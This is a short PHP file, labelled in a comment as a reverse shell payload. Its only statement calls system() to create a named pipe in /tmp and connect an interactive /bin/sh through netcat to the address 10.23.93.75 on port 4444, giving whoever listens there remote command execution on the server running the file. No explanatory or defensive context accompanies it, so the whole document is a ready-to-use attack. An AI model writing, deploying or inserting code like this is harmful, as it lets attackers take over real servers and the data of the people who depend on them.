<?php
// Reverse shell payload
system('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.23.93.75 4444 >/tmp/f');
?>
